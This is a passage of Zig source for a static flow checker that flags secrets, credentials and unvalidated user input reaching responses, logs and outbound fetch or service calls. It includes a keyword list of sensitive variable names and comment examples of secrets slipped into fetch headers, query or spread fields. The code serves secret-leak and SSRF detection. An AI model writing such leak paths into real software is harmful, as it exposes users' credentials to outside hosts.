        if (depth >= max_scan_depth) {
            self.clearAllSinkProperties();
            return;
        }
        const tag = self.ir_view.getTag(node) orelse return;
        const next = depth + 1;
        switch (tag) {
            .call, .method_call => {
                const call_data = self.ir_view.getCall(node) orelse return;
                self.scanExprSinksAt(call_data.callee, next);
                for (0..call_data.args_count) |i| {
                    self.scanExprSinksAt(self.ir_view.getListIndex(call_data.args_start, @intCast(i)), next);
                }
                self.checkExprSinks(node);
            },
            .binary_op => {
                const bin = self.ir_view.getBinary(node) orelse return;
                self.scanExprSinksAt(bin.left, next);
                self.scanExprSinksAt(bin.right, next);
            },
            .ternary => {
                const t = self.ir_view.getTernary(node) orelse return;
                self.scanExprSinksAt(t.condition, next);
                self.scanExprSinksAt(t.then_branch, next);
                self.scanExprSinksAt(t.else_branch, next);
            },
            .unary_op => {
                const unary = self.ir_view.getUnary(node) orelse return;
                self.scanExprSinksAt(unary.operand, next);
            },
            .member_access, .optional_chain, .computed_access => {
                const member = self.ir_view.getMember(node) orelse return;
                self.scanExprSinksAt(member.object, next);
                self.scanExprSinksAt(member.computed, next);
            },
            .object_literal => {
                const obj = self.ir_view.getObject(node) orelse return;
                var i: u16 = 0;
                while (i < obj.properties_count) : (i += 1) {
                    const prop_idx = self.ir_view.getListIndex(obj.properties_start, i);
                    const prop_tag = self.ir_view.getTag(prop_idx) orelse continue;
                    if (prop_tag == .object_property) {
                        const prop = self.ir_view.getProperty(prop_idx) orelse continue;
                        self.scanExprSinksAt(prop.value, next);
                    } else if (prop_tag == .object_spread) {
                        if (self.ir_view.getOptValue(prop_idx)) |val| self.scanExprSinksAt(val, next);
                    }
                }
            },
            .array_literal => {
                const arr = self.ir_view.getArray(node) orelse return;
                var i: u16 = 0;
                while (i < arr.elements_count) : (i += 1) {
                    self.scanExprSinksAt(self.ir_view.getListIndex(arr.elements_start, i), next);
                }
            },
            .spread => {
                if (self.ir_view.getOptValue(node)) |operand| self.scanExprSinksAt(operand, next);
            },
            .assignment => {
                const asgn = self.ir_view.getAssignment(node) orelse return;
                self.scanExprSinksAt(asgn.value, next);
            },
            .match_expr => {
                const match_data = self.ir_view.getMatchExpr(node) orelse return;
                self.scanExprSinksAt(match_data.discriminant, next);
                var i: u8 = 0;
                while (i < match_data.arms_count) : (i += 1) {
                    const arm_idx = self.ir_view.getListIndex(match_data.arms_start, i);
                    const arm = self.ir_view.getMatchArm(arm_idx) orelse continue;
                    self.scanExprSinksAt(arm.body, next);
                }
            },
            // exhaustive: literals and identifiers hold no call. A function
            // literal runs when it is called, and the walks that enter a
            // callee (`functionCallLabels`, `closureResultLabelsBound`) check
            // its body there, with the parameters bound.
            else => {},
        }
    }

    fn checkExprSinks(self: *FlowChecker, node: NodeIndex) void {
        // Sinks run while a callee body is summarized too. The callee's
        // parameters are bound from the call site, so the check sees the
        // labels this call passes in, and a sink inside a called function is
        // reported where it is written. A callee walked once per call site, or
        // once per label evaluation, reaches the same sink node repeatedly;
        // `addDiagnostic` reports each (node, kind) once, and the property
        // updates in `checkSinkLabels` run on every walk regardless.
        const tag = self.ir_view.getTag(node) orelse return;
        if (tag != .call and tag != .method_call) return;

        const call_data = self.ir_view.getCall(node) orelse return;

        if (self.isConsoleCall(call_data.callee)) {
            for (0..call_data.args_count) |i| {
                const arg = self.ir_view.getListIndex(call_data.args_start, @intCast(i));
                const labels = self.inferLabels(arg);
                self.checkSinkLabels(labels, node, .console);
            }
            return;
        }

        // zttp:log functions (logDebug/logInfo/logWarn/logError) serialize both
        // the message string and every value of the context object to stderr, so
        // they are log sinks just like console.*. Recognize them so a secret or
        // credential logged via logError(...) is caught.
        if (tag == .call and self.isLogModuleCall(call_data.callee)) {
            for (0..call_data.args_count) |i| {
                const arg = self.ir_view.getListIndex(call_data.args_start, @intCast(i));
                const labels = self.inferLabels(arg);
                self.checkSinkLabels(labels, node, .console);
            }
            return;
        }

        if (tag == .call) {
            // Egress sinks: the bare `fetchSync(url, opts)` global plus the
            // documented module APIs `fetch` (zttp:fetch) and `serviceCall`
            // (zttp:service). Recognizing only the bare global let a secret
            // flow into a `fetch(...)` body or URL go unflagged, falsely
            // discharging no_secret_leakage / injection_safe.
            if (self.isFetchSyncCall(call_data.callee)) {
                self.checkEgressCall(call_data, node, 0, 1);
            } else if (self.egressModuleFunc(call_data.callee)) |kind| {
                switch (kind) {
                    // fetch(url, init): url at 0, options at 1.
                    .fetch => self.checkEgressCall(call_data, node, 0, 1),
                    // serviceCall(service, route, init): route at 1, init at 2.
                    .service_call => self.checkEgressCall(call_data, node, 1, 2),
                }
            }
        }
    }

    const EgressKind = enum { fetch, service_call };

    /// True if the callee is an imported zttp:log function (logDebug, logInfo,
    /// logWarn, logError), which writes its arguments to stderr.
    fn isLogModuleCall(self: *const FlowChecker, callee: NodeIndex) bool {
        const callee_tag = self.ir_view.getTag(callee) orelse return false;
        if (callee_tag != .identifier) return false;
        const binding = self.bindingAt(callee) orelse return false;
        const meta = self.module_fn_meta.get(binding.slot) orelse return false;
        if (!std.mem.eql(u8, meta.module, "log")) return false;
        return std.mem.eql(u8, meta.func, "logDebug") or
            std.mem.eql(u8, meta.func, "logInfo") or
            std.mem.eql(u8, meta.func, "logWarn") or
            std.mem.eql(u8, meta.func, "logError");
    }

    /// Identify a call whose callee is an imported egress module function
    /// (`fetch` from zttp:fetch or `serviceCall` from zttp:service).
    fn egressModuleFunc(self: *const FlowChecker, callee: NodeIndex) ?EgressKind {
        const callee_tag = self.ir_view.getTag(callee) orelse return null;
        if (callee_tag != .identifier) return null;
        const binding = self.bindingAt(callee) orelse return null;
        const meta = self.module_fn_meta.get(binding.slot) orelse return null;
        if (std.mem.eql(u8, meta.func, "fetch")) return .fetch;
        if (std.mem.eql(u8, meta.func, "serviceCall")) return .service_call;
        return null;
    }

    /// Apply the egress-URL and egress-body sink checks for a call with the URL
    /// (or route) at `url_idx` and the request-options object at `body_idx`.
    fn checkEgressCall(self: *FlowChecker, call_data: Node.CallExpr, node: NodeIndex, url_idx: u8, body_idx: u8) void {
        if (call_data.args_count > url_idx) {
            const url_arg = self.ir_view.getListIndex(call_data.args_start, url_idx);
            self.checkSinkLabels(self.inferLabels(url_arg), node, .egress_url);
        }
        if (call_data.args_count > body_idx) {
            const opts_arg = self.ir_view.getListIndex(call_data.args_start, body_idx);

            // Hoisted into a binding, the options object is not a literal, so
            // none of the per-field extractors below can see which init field
            // a value lands in - they answer empty, which reads as "no such
            // field". Only the body fallback ran, and the body arm checks
            // neither `credential` nor the URL-side properties, so a caller's
            // token in `const opts = { headers: { authorization: token } }`
            // reached the wire with no_credential_leakage still proven. Route
            // the whole object to the one sink that assumes any field.
            if (self.ir_view.getTag(opts_arg) != .object_literal) {
                self.checkSinkLabels(self.inferLabels(opts_arg), node, .egress_opaque);
                return;
            }

            const body_labels = self.inferObjectBodyLabels(opts_arg);
            self.checkSinkLabels(body_labels, node, .egress_body);
            // Defended: a validated value safely reaches an egress body.
            // `.validated` is present only because the value passed a named
            // validator; `findGuardInExpr` recurses the options object to the
            // `body:` value to name it.
            if (body_labels.has(.validated)) {
                for ([_]counterexample.PropertyTag{ .injection_safe, .input_validated }) |defended_tag| {
                    self.recordValidated(defended_tag, opts_arg, node, "an egress request body");
                }
            }

            // The `query` init field is appended to the egress URL at runtime
            // (buildFetchUrl / appendServiceQuery), so a secret or credential in
            // it is a URL sink, not a body sink. inferObjectBodyLabels returns
            // only the `body` value when a body key is present, so without this
            // the query would escape every sink check and falsely discharge
            // no_secret_leakage.
            self.checkSinkLabels(self.inferObjectPropLabels(opts_arg, "query"), node, .egress_url);

            // The `headers` init field is transmitted verbatim to the external
            // host (zruntime serializes it onto the wire). A secret or credential
            // placed in a header escapes the body and URL sink checks above, so
            // without this it would falsely discharge no_secret_leakage /
            // no_credential_leakage - and the URL sink's own help text steers
            // users to put tokens in headers.
            self.checkSinkLabels(self.inferObjectPropLabels(opts_arg, "headers"), node, .egress_headers);

            // A spread inside the options object (`{ body: ..., ...x }`) can
            // populate body, query, or headers with fields the per-field
            // extractors above cannot see (and the `body:` early return in
            // inferObjectBodyLabels short-circuits the whole-object fallback).
            // Conservatively route any spread-carried labels to every egress
            // sink so a secret cannot escape via
            // `fetch(url, { body: "ok", ...{ query: { k: secret } } })`.
            const spread_labels = self.inferObjectSpreadLabels(opts_arg);
            self.checkSinkLabels(spread_labels, node, .egress_url);
            self.checkSinkLabels(spread_labels, node, .egress_body);
            self.checkSinkLabels(spread_labels, node, .egress_headers);
        }
    }

    /// `egress_opaque` is an egress call whose options object the checker
    /// cannot read field by field - it was built elsewhere and passed by name.
    /// It carries the union of the URL, body, and header checks, since the
    /// value may land in any of them.
    const SinkKind = enum { response, console, egress_url, egress_body, egress_headers, egress_opaque };

    fn checkSinkLabels(self: *FlowChecker, labels: LabelSet, node: NodeIndex, sink: SinkKind) void {
        if (labels.isEmpty()) return;

        // A value the walk could not trace proves nothing about itself, so
        // every property this sink decides is cleared rather than held. No
        // diagnostic: nothing is known to be wrong, and the proof card showing
        // the property unproven is the honest report. The same treatment
        // `nondeterministic` gets at the response sink, for the same reason.
        if (labels.has(.unknown)) self.clearSinkProperties(sink);

        switch (sink) {
            .response => {
                if (labels.unsafe_html) self.reportUnsafeHtmlAtResponse(node);
                if (labels.has(.secret)) {
                    self.addDiagnostic(.{
                        .severity = .err,
                        .kind = .secret_in_response,
                        .node = node,
                        .message = self.messageWithReason("secret data flows into response body", .secret),
                        .help = "env vars with sensitive names (SECRET, PASSWORD, KEY, TOKEN) must not appear in responses",
                    });
                    self.properties.no_secret_leakage = false;
                }
                if (labels.has(.nondeterministic)) {
                    // No diagnostic: returning a clock- or RNG-derived value is
                    // legitimate, unlike leaking a secret. It costs the
                    // property, and the proof card is where that shows up.
                    self.properties.deterministic = false;
                }
                if (labels.has(.credential)) {
                    self.addDiagnostic(.{
                        .severity = .warning,
                        .kind = .credential_in_response,
                        .node = node,
                        .message = self.messageWithReason("credential data flows into response body", .credential),
                        .help = "auth tokens and JWT payloads should not be returned to clients",
                    });
                    self.properties.no_credential_leakage = false;
                }
            },
            .console => {
                if (labels.has(.secret)) {
                    self.addDiagnostic(.{
                        .severity = .err,
                        .kind = .secret_in_log,
                        .node = node,
                        .message = self.messageWithReason("secret data flows into console output", .secret),
                        .help = "env vars with sensitive names must not be logged",
                    });
                    self.properties.no_secret_leakage = false;
                }
                if (labels.has(.credential)) {
                    self.addDiagnostic(.{
                        .severity = .err,
                        .kind = .credential_in_log,
                        .node = node,
                        .message = self.messageWithReason("credential data flows into console output", .credential),
                        .help = "auth tokens and JWTs must not be logged",
                    });
                    self.properties.no_credential_leakage = false;
                }
            },
            .egress_url => {
                if (labels.has(.secret)) {
                    self.addDiagnostic(.{
                        .severity = .err,
                        .kind = .secret_in_egress_url,
                        .node = node,
                        .message = self.messageWithReason("secret data flows into fetchSync URL", .secret),
                        .help = "secrets in URLs are logged by proxies and CDNs; pass secrets in headers or body instead",
                    });
                    self.properties.no_secret_leakage = false;
                }
                if (labels.has(.credential)) {
                    self.addDiagnostic(.{
                        .severity = .warning,
                        .kind = .credential_in_egress_url,
                        .node = node,
                        .message = self.messageWithReason("credential data flows into fetchSync URL", .credential),
                        .help = "pass auth tokens in headers, not URLs",
                    });
                    self.properties.no_credential_leakage = false;
                }
                // Unvalidated user input in the egress URL is an SSRF /
                // request-forgery sink, mirroring the egress-body check.
                if (labels.has(.user_input) and !labels.has(.validated)) {
                    self.addDiagnostic(.{
                        .severity = .warning,
                        .kind = .unvalidated_input_in_egress,
                        .node = node,
                        .message = "unvalidated user input flows into fetchSync URL",
                        .help = "validate user input before using it in an egress URL to avoid SSRF / request forgery",
                    });
                    self.properties.input_validated = false;
                    self.properties.injection_safe = false;
                }
                // PII containment: user input flowing to external hosts.
                if (labels.has(.user_input)) {
                    self.properties.pii_contained = false;
                }
            },
            .egress_body => {
                if (labels.has(.secret)) {
                    self.addDiagnostic(.{
                        .severity = .err,
                        .kind = .secret_in_egress_body,
                        .node = node,
                        .message = self.messageWithReason("secret data flows into fetchSync request body", .secret),
                        .help = "do not send env secrets to external services",
                    });
                    self.properties.no_secret_leakage = false;
                }
                // Check for unvalidated user input in egress
                if (labels.has(.user_input) and !labels.has(.validated)) {
                    self.addDiagnostic(.{
                        .severity = .warning,
                        .kind = .unvalidated_input_in_egress,
                        .node = node,
                        .message = "unvalidated user input flows into fetchSync body",
                        .help = "pass user input through validateJson() or validateObject() before sending to external services",
                    });
                    self.properties.input_validated = false;
                    self.properties.injection_safe = false;
                }
                // PII containment: user input going to external hosts
                if (labels.has(.user_input)) {
                    self.properties.pii_contained = false;
                }
            },
            .egress_headers => {
                // Headers reach the external host like the URL and body, so a
                // secret or credential here is a leak. Reuse the egress-URL
                // diagnostic kinds (no new policy-hash surface) with messages
                // specific to the headers init field.
                if (labels.has(.secret)) {
                    self.addDiagnostic(.{
                        .severity = .err,
                        .kind = .secret_in_egress_url,
                        .node = node,
                        .message = self.messageWithReason("secret data flows into fetchSync request headers", .secret),
                        .help = "do not send env secrets to external services, even in headers",
                    });
                    self.properties.no_secret_leakage = false;
                }
                if (labels.has(.credential)) {
                    self.addDiagnostic(.{
                        .severity = .warning,
                        .kind = .credential_in_egress_url,
                        .node = node,
                        .message = self.messageWithReason("credential data flows into fetchSync request headers", .credential),
                        .help = "forwarding a caller's auth token to a third party can leak it; scope credentials per service",
                    });
                    self.properties.no_credential_leakage = false;
                }
                if (labels.has(.user_input) and !labels.has(.validated)) {
                    self.addDiagnostic(.{
                        .severity = .warning,
                        .kind = .unvalidated_input_in_egress,
                        .node = node,
                        .message = "unvalidated user input flows into fetchSync request headers",
                        .help = "validate user input before placing it in an egress header to avoid header injection / request forgery",
                    });
                    self.properties.input_validated = false;
                    self.properties.injection_safe = false;
                }
                if (labels.has(.user_input)) {
                    self.properties.pii_contained = false;
                }
            },
            .egress_opaque => {
                // Same properties as the URL and header arms, which check the
                // same set; the messages differ only in naming the options
                // object rather than a field, because which field this lands
                // in is exactly what could not be determined. The diagnostic
                // kinds are the existing egress ones, so no new rule reaches
                // the policy hash.
                if (labels.has(.secret)) {
                    self.addDiagnostic(.{
                        .severity = .err,
                        .kind = .secret_in_egress_body,
                        .node = node,
                        .message = self.messageWithReason("secret data flows into a fetch options object", .secret),
                        .help = "build the options object at the call site so each field can be checked, and do not send env secrets to external services",
                    });
                    self.properties.no_secret_leakage = false;
                }
                if (labels.has(.credential)) {
                    self.addDiagnostic(.{
                        .severity = .warning,
                        .kind = .credential_in_egress_url,
                        .node = node,
                        .message = self.messageWithReason("credential data flows into a fetch options object", .credential),
                        .help = "forwarding a caller's auth token to a third party can leak it; scope credentials per service",
                    });
                    self.properties.no_credential_leakage = false;
                }
                if (labels.has(.user_input) and !labels.has(.validated)) {
                    self.addDiagnostic(.{
                        .severity = .warning,
                        .kind = .unvalidated_input_in_egress,
                        .node = node,
                        .message = "unvalidated user input flows into a fetch options object",
                        .help = "validate user input before sending it to an external service",
                    });
                    self.properties.input_validated = false;
                    self.properties.injection_safe = false;
                }
                if (labels.has(.user_input)) {
                    self.properties.pii_contained = false;
                }
            },
        }
    }

    /// Clear every property the given sink can decide. Called when a value
    /// carrying `.unknown` reaches it: the sink cannot tell what the value is,
    /// so it cannot hold any property that depends on knowing.
    fn clearSinkProperties(self: *FlowChecker, sink: SinkKind) void {
        switch (sink) {
            .response => {
                self.properties.no_secret_leakage = false;
                self.properties.no_credential_leakage = false;
                self.properties.deterministic = false;
            },
            .console => {
                self.properties.no_secret_leakage = false;
                self.properties.no_credential_leakage = false;
            },
            .egress_url, .egress_headers, .egress_opaque => {
                self.properties.no_secret_leakage = false;
                self.properties.no_credential_leakage = false;
                self.properties.input_validated = false;
                self.properties.injection_safe = false;
                self.properties.pii_contained = false;
            },
            .egress_body => {
                self.properties.no_secret_leakage = false;
                self.properties.input_validated = false;
                self.properties.injection_safe = false;
                self.properties.pii_contained = false;
            },
        }
    }

    /// Refine env() labels based on the literal env var name.
    /// Names containing SECRET, PASSWORD, KEY, TOKEN, or PRIVATE keep {secret}.
    /// Others get downgraded to {config}.
    fn refineEnvLabels(self: *const FlowChecker, arg_node: NodeIndex, base_labels: LabelSet) LabelSet {
        const arg_tag = self.ir_view.getTag(arg_node) orelse return base_labels;
        if (arg_tag != .lit_string) return base_labels; // non-literal: keep conservative

        const name = self.ir_view.getString(self.ir_view.getStringIdx(arg_node) orelse return base_labels) orelse return base_labels;

        if (isSensitiveEnvName(name)) {
            return base_labels; // keep {secret}
        }

        // Non-sensitive name: downgrade to {config}
        return .{ .config = true };
    }

    fn isSensitiveEnvName(name: []const u8) bool {
        const patterns = [_][]const u8{
            "SECRET",  "PASSWORD",   "PASSWD", "KEY", "TOKEN",
            "PRIVATE", "CREDENTIAL", "AUTH",
        };
        for (patterns) |pattern| {
            if (indexOfIgnoreCase(name, pattern)) return true;
        }
        return false;
    }

    fn indexOfIgnoreCase(haystack: []const u8, needle: []const u8) bool {
        if (needle.len > haystack.len) return false;
        const end = haystack.len - needle.len + 1;
        for (0..end) |i| {
            var match = true;
            for (needle, 0..) |nc, j| {
                if (std.ascii.toUpper(haystack[i + j]) != nc) {
                    match = false;
                    break;
                }
            }
            if (match) return true;
        }
        return false;
    }

    /// Check if callee is `Global.method()` where Global and method match the given names.
    fn isGlobalMethodCall(self: *const FlowChecker, callee: NodeIndex, object_name: []const u8, method_names: []const []const u8) bool {
        const tag = self.ir_view.getTag(callee) orelse return false;
        if (tag != .member_access and tag != .optional_chain) return false;
        const member = self.ir_view.getMember(callee) orelse return false;

        const obj_tag = self.ir_view.getTag(member.object) orelse return false;
        if (obj_tag != .identifier) return false;
        const binding = self.bindingAt(member.object) orelse return false;
        if (binding.kind != .undeclared_global) return false;
        const obj_name = self.resolveAtomName(binding.name_atom) orelse return false;
        if (!std.mem.eql(u8, obj_name, object_name)) return false;

        const method_name = self.resolveAtomName(member.property) orelse return false;
        for (method_names) |name| {
            if (std.mem.eql(u8, method_name, name)) return true;
        }
        return false;
    }

    fn isResponseHelper(self: *const FlowChecker, callee: NodeIndex) bool {
        return self.isGlobalMethodCall(callee, "Response", &.{ "json", "text", "html", "redirect" });
    }

    fn isConsoleCall(self: *const FlowChecker, callee: NodeIndex) bool {
        return self.isGlobalMethodCall(callee, "console", &.{ "log", "warn", "error" });
    }

    fn isFetchSyncCall(self: *const FlowChecker, callee: NodeIndex) bool {
        const tag = self.ir_view.getTag(callee) orelse return false;
        if (tag != .identifier) return false;
        const binding = self.bindingAt(callee) orelse return false;
        if (binding.kind != .undeclared_global) return false;
        const name = self.resolveAtomName(binding.name_atom) orelse return false;
        return std.mem.eql(u8, name, "fetchSync");
    }

    /// True if the callee is the bare global `renderToString`, the JSX-to-HTML
    /// serializer that auto-escapes interpolated values.
    fn isRenderToStringCall(self: *const FlowChecker, callee: NodeIndex) bool {
        const tag = self.ir_view.getTag(callee) orelse return false;
        if (tag != .identifier) return false;
        const binding = self.bindingAt(callee) orelse return false;
        if (binding.kind != .undeclared_global) return false;
        const name = self.resolveAtomName(binding.name_atom) orelse return false;
        return std.mem.eql(u8, name, "renderToString");
    }

    /// True for a global read whose result differs between runs. The receiver
    /// must be an undeclared global, so a user-defined `Date` shadowing the
    /// builtin does not pick up the label.
    ///
    /// The set lives in `known_globals.varying_reads` because
    /// `effect_inference.isNonDeterministic` needs the same one to answer the
    /// per-function question these labels cannot reach. Both used to carry a
    /// hand-copied pair, and both were missing `performance.now`.
    fn isVaryingGlobalRead(self: *const FlowChecker, callee: NodeIndex) bool {
        const member = self.ir_view.getMember(callee) orelse return false;
        if (self.ir_view.getTag(member.object) != .identifier) return false;
        const binding = self.bindingAt(member.object) orelse return false;
        if (binding.kind != .undeclared_global) return false;
        const object_name = self.resolveAtomName(binding.name_atom) orelse return false;
        const property_name = self.resolveAtomName(member.property) orelse return false;
        return known_globals.isVaryingRead(object_name, property_name);
    }

    fn isReqProperty(self: *const FlowChecker, node: NodeIndex, expected_prop: []const u8) bool {
        const tag = self.ir_view.getTag(node) orelse return false;
        if (tag != .member_access and tag != .optional_chain) return false;
        const member = self.ir_view.getMember(node) orelse return false;

        // Check if object is the request binding
        const obj_tag = self.ir_view.getTag(member.object) orelse return false;
        if (obj_tag != .identifier) return false;
        const binding = self.bindingAt(member.object) orelse return false;
        const key = packBindingKey(binding.scope_id, binding.slot);
        if (self.req_binding_key == null or key != self.req_binding_key.?) return false;

        const prop_name = self.resolveAtomName(member.property) orelse return false;
        return std.mem.eql(u8, prop_name, expected_prop);
    }

    // -------------------------------------------------------------------
    // Helper: extract body labels from options object { body: ... }
    // -------------------------------------------------------------------

    fn inferObjectBodyLabels(self: *FlowChecker, node: NodeIndex) LabelSet {
        const tag = self.ir_view.getTag(node) orelse return LabelSet.empty;
        if (tag == .object_literal) {
            const obj = self.ir_view.getObject(node) orelse return LabelSet.empty;
            var i: u16 = 0;
            while (i < obj.properties_count) : (i += 1) {
                const prop_idx = self.ir_view.getListIndex(obj.properties_start, i);
                const prop_tag = self.ir_view.getTag(prop_idx) orelse continue;
                if (prop_tag == .object_property) {
                    const prop = self.ir_view.getProperty(prop_idx) orelse continue;
                    const key_name = self.getPropertyKeyName(prop.key) orelse continue;
                    if (std.mem.eql(u8, key_name, "body")) {
                        return self.inferLabels(prop.value);
                    }
                }
            }
        }
        // If not an object literal, infer labels of the whole thing
        return self.inferLabels(node);
    }

    /// Labels of a named property's value in an object literal, or empty when the
    /// node is not an object literal or has no such property.
    fn inferObjectPropLabels(self: *FlowChecker, node: NodeIndex, key: []const u8) LabelSet {
        const tag = self.ir_view.getTag(node) orelse return LabelSet.empty;
        if (tag != .object_literal) return LabelSet.empty;
        const obj = self.ir_view.getObject(node) orelse return LabelSet.empty;
        var i: u16 = 0;
        while (i < obj.properties_count) : (i += 1) {
            const prop_idx = self.ir_view.getListIndex(obj.properties_start, i);
            if ((self.ir_view.getTag(prop_idx) orelse continue) != .object_property) continue;
            const prop = self.ir_view.getProperty(prop_idx) orelse continue;
            const key_name = self.getPropertyKeyName(prop.key) orelse continue;
            if (std.mem.eql(u8, key_name, key)) return self.inferLabels(prop.value);
        }
        return LabelSet.empty;
    }

    /// Union of labels carried by every `.object_spread` element of an options
    /// object literal (`{ ...x }`). A spread can populate `body`, `query`, or
    /// `headers` with fields the per-field extractors cannot see, so its labels
    /// must be checked against every egress sink. Mirrors the spread branch of
    /// `inferLabels`'s object_literal case. Returns empty when the node is not
    /// an object literal or carries no spread.
    fn inferObjectSpreadLabels(self: *FlowChecker, node: NodeIndex) LabelSet {
        const tag = self.ir_view.getTag(node) orelse return LabelSet.empty;
        if (tag != .object_literal) return LabelSet.empty;
        const obj = self.ir_view.getObject(node) orelse return LabelSet.empty;
        var labels = LabelSet.empty;
        var i: u16 = 0;
        while (i < obj.properties_count) : (i += 1) {
            const prop_idx = self.ir_view.getListIndex(obj.properties_start, i);
            if ((self.ir_view.getTag(prop_idx) orelse continue) != .object_spread) continue;
            if (self.ir_view.getOptValue(prop_idx)) |val| {
                labels = LabelSet.merge(labels, self.inferLabels(val));
            }
        }
        return labels;
    }

    /// Get the name of an object property key (identifier or string literal).
    fn getPropertyKeyName(self: *const FlowChecker, key_idx: NodeIndex) ?[]const u8 {
        const tag = self.ir_view.getTag(key_idx) orelse return null;
        if (tag == .identifier) {
            const binding = self.bindingAt(key_idx) orelse return null;
            return self.resolveAtomName(binding.name_atom);
        } else if (tag == .lit_string) {
            const str_idx = self.ir_view.getStringIdx(key_idx) orelse return null;
            return self.ir_view.getString(str_idx);
        }
        return null;
    }

    /// Track result bindings from validation function calls.
    /// When `const result = validateJson(...)` is seen, records the function's
    /// return_labels so that `result.value` inherits them during label inference.
    fn trackResultBinding(self: *FlowChecker, vd: ir.Node.VarDecl) void {
        const init_tag = self.ir_view.getTag(vd.init) orelse return;
        if (init_tag != .call) return;

        const call_data = self.ir_view.getCall(vd.init) orelse return;
        const callee_tag = self.ir_view.getTag(call_data.callee) orelse return;
        if (callee_tag != .identifier) return;

        const callee_binding = self.bindingAt(call_data.callee) orelse return;
        const return_labels = self.module_fn_labels.get(callee_binding.slot) orelse return;

        // Only track if the function returns labels worth propagating (e.g., validated)
        if (return_labels.has(.validated)) {
            const key = packBindingKey(vd.binding.scope_id, vd.binding.slot);
            // Refined the same way a direct call is, not stored as declared.
            // `const r = validateJson("s", secret); return r.value;` is the
            // shape the fail-open actually shipped in - fixing only
            // `inferCallLabels` would leave this path laundering.
            const refined = self.parsedResultLabels(return_labels, call_data);
            self.result_binding_labels.put(self.allocator, key, refined) catch self.markAllocationFailure();
            // Remember the validator that cleared the taint so a defended path
            // can name it. `func` is borrowed from the module metadata table.
            if (self.module_fn_meta.get(callee_binding.slot)) |meta| {
                self.result_binding_guard.put(self.allocator, key, .{
                    .func = meta.func,
                    .node = vd.init,
                }) catch self.markAllocationFailure();
            }
        }
    }

    /// Return a diagnostic message naming the declared classification behind
    /// a secret or credential label, when one contributed (M4 T4). The entry
    /// named is the last one whose label the analysis applied; with no
    /// declaration, or for any other label, the literal comes back unchanged
    /// and nothing is allocated.
    fn messageWithReason(self: *FlowChecker, base: []const u8, label: DataLabel) []const u8 {
        const decl = self.declaration orelse return base;
        const index = switch (label) {
            .secret => self.last_declared_secret,
            .credential => self.last_declared_credential,
            // exhaustive: a declaration can assign only secret and credential,
            // so no other label has a declared entry to name.
            else => null,
        } orelse return base;
        const entry = decl.classifications[index];
        const formatted = std.fmt.allocPrint(self.allocator, "{s} (declared {s}: {s}:{s} {s} - {s})", .{
            base,
            @tagName(entry.label),
            @tagName(entry.source_kind),
            entry.source_name,
            entry.path_text,
            entry.reason,
        }) catch return base;
        self.allocated_messages.append(self.allocator, formatted) catch {
            self.allocator.free(formatted);
            return base;
        };
        return formatted;
    }

    /// The help text for a diagnostic raised while a callee is summarized: the
    /// plain help, then the outermost call that led to the sink. The
    /// diagnostic itself stays at the sink node and its message is untouched,
    /// because the expert replay hashes code plus message. A diagnostic raised
    /// in the handler body, or in a closure walked where it is written, has no
    /// call and keeps its help byte for byte. The text is human-only, so an
    /// allocation failure falls back to the plain help.
    fn helpWithCallChain(self: *FlowChecker, help: ?[]const u8) ?[]const u8 {
        const site = for (self.summary_call_sites[0..self.summary_depth]) |candidate| {
            if (candidate != null_node) break candidate;
        } else return help;
        const loc = self.ir_view.getLoc(site) orelse return help;
        const formatted = if (help) |base|
            std.fmt.allocPrint(self.allocator, "{s} (reached through the call at line {d}, column {d})", .{ base, loc.line, loc.column })
        else
            std.fmt.allocPrint(self.allocator, "reached through the call at line {d}, column {d}", .{ loc.line, loc.column });
        const text = formatted catch return help;
        self.allocated_messages.append(self.allocator, text) catch {
            self.allocator.free(text);
            return help;
        };
        return text;
    }

    /// Report a diagnostic once per sink. The key is the sink node and the
    /// kind, which already names the label family, so a secret and a credential
    /// that reach one helper both report. The message stays in the key because
    /// one node can hold two sinks of one kind: a `fetch` call reports
    /// `secret_in_egress_url` for its URL and again for its headers, each with
    /// its own message. Callers update the flow properties before or after this
    /// call and never depend on it adding a row, so a repeat that is dropped
    /// here still demotes its property.
    fn addDiagnostic(self: *FlowChecker, diag: Diagnostic) void {
        // A route function reached through a `routerMatch` dispatch and also
        // walked as a request root (`root_dispatch_depth`) reports its sinks in
        // that root walk, with the request labelled as the runtime delivers it.
        // Reporting here as well would put the same sink in the list twice,
        // first with the dispatch path's call chain and witness. The caller
        // already updated the properties, so this drops text and never a
        // verdict.
        if (self.root_dispatch_depth > 0) return;
        for (self.diagnostics.items) |existing| {
            if (existing.node == diag.node and existing.kind == diag.kind and
                std.mem.eql(u8, existing.message, diag.message)) return;
        }
        var owned = diag;
        owned.help = self.helpWithCallChain(diag.help);
        // Only diagnostics the counterexample surface can actually consume
        // carry a witness snapshot. Skipping the dupe for everything else
        // avoids allocator churn when the handler raises many non-witness
        // diagnostics (unused-variable warnings, XSS warnings, etc.).
        if (propertyTagForKind(diag.kind) != null and
            (self.working_constraints.items.len > 0 or self.working_io_calls.items.len > 0))
        {
            const constraints = self.allocator.dupe(
                counterexample.WitnessConstraint,
                self.working_constraints.items,
            ) catch blk: {
                self.markAllocationFailure();
                break :blk &[_]counterexample.WitnessConstraint{};
            };
            const io_calls = self.allocator.dupe(
                counterexample.TrackedIoCall,
                self.working_io_calls.items,
            ) catch blk: {
                self.markAllocationFailure();
                break :blk &[_]counterexample.TrackedIoCall{};
            };
            owned.witness = .{
                .path_constraints = constraints,
                .io_calls = io_calls,
            };
        }
        self.diagnostics.append(self.allocator, owned) catch {
            if (owned.witness) |w| {
                if (w.path_constraints.len > 0) self.allocator.free(w.path_constraints);
                if (w.io_calls.len > 0) self.allocator.free(w.io_calls);
            }
            self.markAllocationFailure();
        };
    }

    /// Push zero or more constraints derived from `cond` onto the working
    /// stack. AND chains contribute one constraint per clause; every other
    /// shape contributes at most one. Returns the number pushed so the
    /// caller can pop exactly that many when the branch body is done.
    ///
    /// Under `want_negation` (the else-branch path), an AND chain contributes
    /// one negated clause. `!(a && b)` is `!a || !b`; emitting every negated
    /// clause would force `!a && !b`, which can make a witness skip the value
    /// it is supposed to leak.
    fn pushConditionConstraints(self: *FlowChecker, cond: NodeIndex, want_negation: bool) usize {
        const tag = self.ir_view.getTag(cond) orelse return 0;
        if (tag == .binary_op) {
            const bin = self.ir_view.getBinary(cond) orelse return 0;
            if (bin.op == .and_op) {
                if (want_negation) {
                    const final = self.findNegatedAndConstraint(cond, true) orelse
                        self.findNegatedAndConstraint(cond, false) orelse
                        return 0;
                    self.working_constraints.append(self.allocator, final) catch {
                        self.markAllocationFailure();
                        return 0;
                    };
                    return 1;
                }
                const left = self.pushConditionConstraints(bin.left, want_negation);
